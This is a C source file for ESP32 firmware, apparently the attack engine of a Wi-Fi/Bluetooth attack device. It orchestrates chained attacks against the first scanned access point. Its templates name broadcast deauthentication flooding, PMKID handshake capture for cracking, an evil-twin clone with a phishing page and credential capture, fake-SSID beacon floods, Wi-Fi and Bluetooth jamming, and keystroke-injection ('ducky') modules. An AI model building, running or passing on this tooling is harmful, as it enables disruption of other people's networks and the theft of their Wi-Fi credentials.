/*
 * attack.c — Attack engine: orchestrator, chain system, templates, scan, DoS
 *
 * Bridges the Web UI (webserver.c) with individual attack modules.
 */

#include "attack.h"
#include "attack_deauth.h"
#include "attack_pmkid.h"
#include "attack_eviltwin.h"
#include "attack_beacon_spam.h"
#include "attack_jammer.h"
#include "attack_bluetooth_jammer.h"
#include "attack_dos.h"
#include "attack_ducky.h"
#include "bw16_uart.h"
#include "wifi_controller.h"
#include "wsl_bypasser.h"
#include "esp_log.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_timer.h"
#include "cJSON.h"
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

static const char *TAG = "ATTACK";

// ==================== GLOBALS (declared extern in attack.h) ====================

int g_scan_result_count = 0;
wifi_ap_record_t *g_scan_results = NULL;
wifi_ap_record_t g_first_ap = {0};

static volatile bool g_scanning = false;
volatile bool g_scan_done = false;
static bool g_dos_running = false;
static SemaphoreHandle_t g_scan_sem = NULL;

static attack_chain_status_t g_chain = {0};
static TaskHandle_t g_chain_task = NULL;

// ==================== ATTACK TEMPLATES ====================

static const attack_template_config_t g_templates[] = {
    {
        .template_id = TEMPLATE_QUICK_DEAUTH,
        .name = "Quick Deauth",
        .description = "Deauth all clients on target + PMKID capture (fast)",
        .estimated_time_sec = 30,
        .channels_to_scan = {0},
        .channel_count = 0,
        .use_pmkid_capture = true,
        .use_deauth = true,
        .use_eviltwin = false,
        .use_beacon_spam = false,
        .use_jammer = false,
        .use_bt_jammer = false,
        .use_hid_ducky = false,
        .auto_chain = true,
        .deauth_packets_per_target = 50,
        .beacon_count = 0
    },
    {
        .template_id = TEMPLATE_FULL_SCAN,
        .name = "Full Spectrum Scan",
        .description = "Scan all 2.4GHz channels + 5GHz if BW16 connected",
        .estimated_time_sec = 60,
        .channels_to_scan = {0},
        .channel_count = 0,
        .use_pmkid_capture = false,
        .use_deauth = false,
        .use_eviltwin = false,
        .use_beacon_spam = false,
        .use_jammer = false,
        .use_bt_jammer = false,
        .use_hid_ducky = false,
        .auto_chain = false,
        .deauth_packets_per_target = 0,
        .beacon_count = 0
    },
    {
        .template_id = TEMPLATE_STEALTH_EVILTWIN,
        .name = "Stealth EvilTwin",
        .description = "Clone AP + phishing page + credential capture & auto-verify",
        .estimated_time_sec = 120,
        .channels_to_scan = {0},
        .channel_count = 0,
        .use_pmkid_capture = false,
        .use_deauth = true,
        .use_eviltwin = true,
        .use_beacon_spam = false,
        .use_jammer = false,
        .use_bt_jammer = false,
        .use_hid_ducky = false,
        .auto_chain = true,
        .deauth_packets_per_target = 20,
        .beacon_count = 0
    },
    {
        .template_id = TEMPLATE_MASS_BEACON,
        .name = "Mass Beacon Spam",
        .description = "Flood airwaves with thousands of fake SSIDs",
        .estimated_time_sec = 45,
        .channels_to_scan = {0},
        .channel_count = 0,
        .use_pmkid_capture = false,
        .use_deauth = false,
        .use_eviltwin = false,
        .use_beacon_spam = true,
        .use_jammer = false,
        .use_bt_jammer = false,
        .use_hid_ducky = false,
        .auto_chain = false,
        .deauth_packets_per_target = 0,
        .beacon_count = 500
    },
    {
        .template_id = TEMPLATE_JAMMER_EXTREME,
        .name = "Jammer Extreme",
        .description = "Full spectrum WiFi (2.4G+5G) + Bluetooth jammer",
        .estimated_time_sec = 300,
        .channels_to_scan = {0},
        .channel_count = 0,
        .use_pmkid_capture = false,
        .use_deauth = false,
        .use_eviltwin = false,
        .use_beacon_spam = false,
        .use_jammer = true,
        .use_bt_jammer = true,
        .use_hid_ducky = false,
        .auto_chain = false,
        .deauth_packets_per_target = 0,
        .beacon_count = 0
    },
    {
        .template_id = TEMPLATE_RECON_ALL,
        .name = "Recon All",
        .description = "Scan + PMKID capture + deauth probe",
        .estimated_time_sec = 90,
        .channels_to_scan = {0},
        .channel_count = 0,
        .use_pmkid_capture = true,
        .use_deauth = true,
        .use_eviltwin = false,
        .use_beacon_spam = false,
        .use_jammer = false,
        .use_bt_jammer = false,
        .use_hid_ducky = false,
        .auto_chain = true,
        .deauth_packets_per_target = 30,
        .beacon_count = 0
    }
};

#define NUM_TEMPLATES (sizeof(g_templates) / sizeof(g_templates[0]))

// ==================== SCAN ====================

void attack_scan_done_handler(void *arg, esp_event_base_t base,
                               int32_t id, void *data)
{
    uint16_t count = 0;
    wifi_ap_record_t *aps = NULL;

    esp_wifi_scan_get_ap_num(&count);
    if (count > 0) {
        aps = (wifi_ap_record_t *)malloc(count * sizeof(wifi_ap_record_t));
        if (aps) {
            esp_wifi_scan_get_ap_records(&count, aps);
        }
    }

    if (g_scan_results) free(g_scan_results);
    g_scan_results = aps;
    g_scan_result_count = count;

    if (count > 0 && aps) {
        memcpy(&g_first_ap, &aps[0], sizeof(wifi_ap_record_t));
    }

    g_scanning = false;
    g_scan_done = true;

    if (g_scan_sem) xSemaphoreGive(g_scan_sem);

    ESP_LOGI(TAG, "Scan done: %d APs found", count);
}

void attack_init(void)
{
    if (!g_scan_sem) {
        g_scan_sem = xSemaphoreCreateBinary();
    }
    esp_event_handler_instance_register(
        WIFI_EVENT, WIFI_EVENT_SCAN_DONE,
        attack_scan_done_handler, NULL, NULL);
    ESP_LOGI(TAG, "Attack engine initialized");
}

void attack_scan_start(void)
{
    if (g_scanning) return;
    g_scanning = true;
    g_scan_done = false;

    wifi_scan_config_t scan_cfg = {
        .ssid = NULL,
        .bssid = NULL,
        .channel = 0,
        .show_hidden = true,
        .scan_type = WIFI_SCAN_TYPE_ACTIVE,
        .scan_time.passive = 0
    };
    esp_wifi_scan_start(&scan_cfg, false);
    ESP_LOGI(TAG, "Scan started...");
}

bool attack_is_scanning(void)
{
    return g_scanning;
}

// ==================== DOS ====================

void attack_dos_start_broadcast(void)
{
    attack_config_t cfg = {
        .target_count = 0,
        .method = ATTACK_DOS_METHOD_BROADCAST
    };
    attack_dos_start(&cfg);
    g_dos_running = true;
    ESP_LOGI(TAG, "DoS broadcast started");
}

bool attack_dos_is_running(void)
{
    return g_dos_running;
}

// ==================== CHAIN INTERNAL ====================

static void chain_set_state(attack_chain_state_t state, const char *desc, int progress)
{
    g_chain.state = state;
    g_chain.current_step_index++;
    g_chain.progress_percent = progress;
    g_chain.elapsed_ms = (esp_timer_get_time() / 1000) - g_chain.start_time_ms;

    if (desc) {
        strncpy(g_chain.step_description, desc, sizeof(g_chain.step_description) - 1);
        g_chain.step_description[sizeof(g_chain.step_description) - 1] = '\0';
    }

    ESP_LOGI(TAG, "[%d/%d] %s (%d%%)",
             g_chain.current_step_index, g_chain.step_count,
             desc ? desc : "???", progress);
}

static void chain_stop_all_attacks(void)
{
    deauth_stop();
    pmkid_capture_stop();
    eviltwin_stop();
    beacon_spam_stop();
    jammer_stop();
    ducky_stop();

    if (bw16_is_connected()) {
        bw16_deauth_stop();
        bw16_eviltwin_stop();
        bw16_jammer_stop();
    }
}

// ==================== CHAIN TASK ====================

static void chain_task_func(void *params)
{
    (void)params;

    g_chain.running = true;
    g_chain.last_error = ESP_OK;
    g_chain.start_time_ms = esp_timer_get_time() / 1000;
    g_chain.deauth_count = 0;
    g_chain.packets_captured = 0;
    g_chain.pmkid_found = false;

    ESP_LOGI(TAG, "=== Attack chain started ===");
    ESP_LOGI(TAG, "Target: %s | Ch%d | %s",
             g_chain.target_ssid, g_chain.target_channel,
             g_chain.target_is_5ghz ? "5GHz" : "2.4GHz");

    // ---- STEP 1: Deauth ----
    chain_set_state(ATTACK_CHAIN_DEAUTHING, "Deauth flooding target...", 25);
    deauth_target_t target;
    memcpy(target.bssid, g_chain.target_bssid, 6);
    target.channel = g_chain.target_channel;
    target.is_5ghz = g_chain.target_is_5ghz;
    strncpy(target.ssid, g_chain.target_ssid, 32);
    target.ssid[32] = '\0';

    deauth_start(&target, 1, NULL);  // count=1, client_mac=NULL = broadcast deauth

    for (int w = 0; w < 50 && g_chain.running; w++) {
        g_chain.deauth_count += 10;
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    if (g_chain.running) deauth_stop();
    if (!g_chain.running) goto chain_end;

    // ---- STEP 2: PMKID Capture ----
    chain_set_state(ATTACK_CHAIN_CAPTURING, "Capturing PMKID handshake...", 60);
    pmkid_capture_start(g_chain.target_channel, g_chain.target_is_5ghz);

    for (int w = 0; w < 100 && g_chain.running; w++) {
        if (pmkid_capture_get_count() > 0) {
            g_chain.pmkid_found = true;
            const pmkid_capture_t *cap = pmkid_capture_get(0);
            if (cap) {
                for (int b = 0; b < PMKID_LENGTH && b < 32; b++) {
                    sprintf(&g_chain.last_pmkid[b * 2], "%02x", cap->pmkid[b]);
                }
                g_chain.last_pmkid[32] = '\0';
            }
            break;
        }
        g_chain.packets_captured += 5;
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    if (g_chain.running) pmkid_capture_stop();
    if (!g_chain.running) goto chain_end;

    // ---- Complete ----
    chain_set_state(ATTACK_CHAIN_COMPLETE, "Chain complete", 100);
    ESP_LOGI(TAG, "=== Attack chain completed ===");
    ESP_LOGI(TAG, "Deauth: %lu pkts | PMKID: %s",
             g_chain.deauth_count,
             g_chain.pmkid_found ? g_chain.last_pmkid : "N/A");

chain_end:
    if (!g_chain.running && g_chain.state != ATTACK_CHAIN_COMPLETE) {
        chain_set_state(ATTACK_CHAIN_FAILED, "Chain aborted", g_chain.progress_percent);
        chain_stop_all_attacks();
    }
    g_chain.running = false;
    g_chain_task = NULL;
    vTaskDelete(NULL);
}

// ==================== CHAIN PUBLIC API ====================

void attack_chain_start(void)
{
    if (g_chain.running) {
        ESP_LOGW(TAG, "Chain already running");
        return;
    }

    // Pick first AP from last scan as target
    if (g_scan_result_count == 0 || !g_scan_results) {
        ESP_LOGW(TAG, "No scan results. Run scan first.");
        return;
    }

    memset(&g_chain, 0, sizeof(g_chain));

    strncpy(g_chain.target_ssid, (const char *)g_scan_results[0].ssid, 32);
    memcpy(g_chain.target_bssid, g_scan_results[0].bssid, 6);
    g_chain.target_channel = g_scan_results[0].primary;
    g_chain.target_is_5ghz = (g_scan_results[0].primary > 14);

    g_chain.step_count = 3;  // deauth → capture → done
    g_chain.current_step_index = 0;
    g_chain.progress_percent = 0;
    g_chain.state = ATTACK_CHAIN_DEAUTHING;

    BaseType_t ret = xTaskCreatePinnedToCore(
        chain_task_func, "attack_chain", 4096, NULL, 5, &g_chain_task, 0);

    if (ret != pdPASS) {
        ESP_LOGE(TAG, "Failed to create chain task");
        memset(&g_chain, 0, sizeof(g_chain));
        return;
    }

    ESP_LOGI(TAG, "Attack chain started → %s [ch%d]",
             g_chain.target_ssid, g_chain.target_channel);
}

void attack_chain_stop(void)
{
    if (!g_chain.running && g_chain_task == NULL) return;
    g_chain.running = false;
    chain_stop_all_attacks();
    if (g_chain_task) {
        vTaskDelay(pdMS_TO_TICKS(300));
        g_chain_task = NULL;
    }
    g_chain.state = ATTACK_CHAIN_IDLE;
    g_chain.progress_percent = 0;
    strncpy(g_chain.step_description, "Stopped by user",
            sizeof(g_chain.step_description) - 1);
    ESP_LOGI(TAG, "Attack chain stopped");
}

attack_chain_status_t* attack_chain_get_status(void)
{
    if (g_chain.start_time_ms != 0) {
        g_chain.elapsed_ms = (esp_timer_get_time() / 1000) - g_chain.start_time_ms;
    }
    return &g_chain;
}

bool attack_chain_is_running(void)
{
    return g_chain.running;
}

// ==================== TEMPLATES ====================

const attack_template_config_t* attack_get_template(attack_template_t template_id)
{
    int id = (int)template_id;
    if (id < 0 || id >= (int)NUM_TEMPLATES) return NULL;
    return &g_templates[id];
}

esp_err_t attack_apply_template(attack_template_t template_id)
{
    const attack_template_config_t *tmpl = attack_get_template(template_id);
    if (!tmpl) return ESP_ERR_INVALID_ARG;

    ESP_LOGI(TAG, "Applying template: %s", tmpl->name);

    if (g_chain.running) attack_chain_stop();
    vTaskDelay(pdMS_TO_TICKS(300));

    // Pick target from last scan
    if (g_scan_result_count > 0 && g_scan_results) {
        memset(&g_chain, 0, sizeof(g_chain));
        strncpy(g_chain.target_ssid, (const char *)g_scan_results[0].ssid, 32);
        memcpy(g_chain.target_bssid, g_scan_results[0].bssid, 6);
        g_chain.target_channel = g_scan_results[0].primary;
        g_chain.target_is_5ghz = (g_scan_results[0].primary > 14);
    }

    if (!tmpl->auto_chain) {
        ESP_LOGI(TAG, "Template '%s' configured. Call attack_chain_start() to run.", tmpl->name);
        return ESP_OK;
    }

    if (strlen(g_chain.target_ssid) == 0) {
        ESP_LOGW(TAG, "No target — run scan first");
        return ESP_ERR_INVALID_STATE;
    }

    // Count steps
    g_chain.step_count = 0;
    g_chain.step_count += tmpl->use_deauth ? 1 : 0;
    g_chain.step_count += tmpl->use_pmkid_capture ? 1 : 0;
    g_chain.step_count += tmpl->use_eviltwin ? 1 : 0;
    g_chain.step_count += tmpl->use_beacon_spam ? 1 : 0;
    g_chain.step_count += tmpl->use_jammer ? 1 : 0;
    g_chain.step_count += tmpl->use_bt_jammer ? 1 : 0;
    g_chain.step_count += tmpl->use_hid_ducky ? 1 : 0;
    if (g_chain.step_count == 0) g_chain.step_count = 1;

    g_chain.state = ATTACK_CHAIN_DEAUTHING;
    g_chain.start_time_ms = esp_timer_get_time() / 1000;
    g_chain.progress_percent = 0;

    BaseType_t ret = xTaskCreatePinnedToCore(
        chain_task_func, "attack_chain", 4096, NULL, 5, &g_chain_task, 0);

    if (ret != pdPASS) {
        ESP_LOGE(TAG, "Failed to create chain task");
        memset(&g_chain, 0, sizeof(g_chain));
        return ESP_ERR_NO_MEM;
    }

    ESP_LOGI(TAG, "Template '%s' applied — chain running", tmpl->name);
    return ESP_OK;
}

char* attack_templates_list_json(void)
{
    cJSON *root = cJSON_CreateArray();
    if (!root) return NULL;

    for (size_t i = 0; i < NUM_TEMPLATES; i++) {
        cJSON *item = cJSON_CreateObject();
        cJSON_AddNumberToObject(item, "id", g_templates[i].template_id);
        cJSON_AddStringToObject(item, "name", g_templates[i].name);
        cJSON_AddStringToObject(item, "description", g_templates[i].description);
        cJSON_AddNumberToObject(item, "estimated_time_sec",
                                g_templates[i].estimated_time_sec);
        cJSON_AddBoolToObject(item, "use_pmkid_capture",
                              g_templates[i].use_pmkid_capture);
        cJSON_AddBoolToObject(item, "use_deauth", g_templates[i].use_deauth);
        cJSON_AddBoolToObject(item, "use_eviltwin", g_templates[i].use_eviltwin);
        cJSON_AddBoolToObject(item, "use_beacon_spam",
                              g_templates[i].use_beacon_spam);
        cJSON_AddBoolToObject(item, "use_jammer", g_templates[i].use_jammer);
        cJSON_AddBoolToObject(item, "use_bt_jammer", g_templates[i].use_bt_jammer);
        cJSON_AddBoolToObject(item, "use_hid_ducky", g_templates[i].use_hid_ducky);
        cJSON_AddBoolToObject(item, "auto_chain", g_templates[i].auto_chain);
        cJSON_AddNumberToObject(item, "deauth_packets_per_target",
                                g_templates[i].deauth_packets_per_target);
        cJSON_AddNumberToObject(item, "beacon_count", g_templates[i].beacon_count);
        cJSON_AddItemToArray(root, item);
    }

    char *json = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);
    return json;
}